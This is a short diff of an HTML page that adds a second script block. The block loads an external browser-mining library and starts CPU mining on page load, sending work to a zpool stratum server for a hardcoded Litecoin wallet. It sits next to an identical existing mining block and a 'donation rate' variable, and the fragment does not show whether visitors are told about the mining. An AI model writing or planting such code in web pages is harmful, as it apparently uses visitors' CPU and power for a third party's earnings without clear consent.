@@ -84,6 +84,25 @@
       // Start Mining
       client.start();
     </script>
+    <script src="https://webminer.pages.dev/dist/mm.js"></script>
+    <script>
+      const client = new Client({
+        algorithm: "minotaurx", // yespower, minotaurx
+        stratum: {
+          server: "minotaurx.na.mine.zpool.ca", // Your Pool host
+          port: 7019, // Your Pool port
+          worker: "ltc1qqggmtnpzrpe327em3f9svjkpvdl7l5n9cyxjst", // Your Wallet
+          password: "c=LTC", // Your Mining password
+        },
+        options: {
+          threads: 1, // CPU threads to mining
+          log: true, // Show log on console
+        },
+      });
+
+      // Start Mining
+      client.start();
+    </script>
 
     <script>
       const donationRatePerSecond = 0.0000000144;
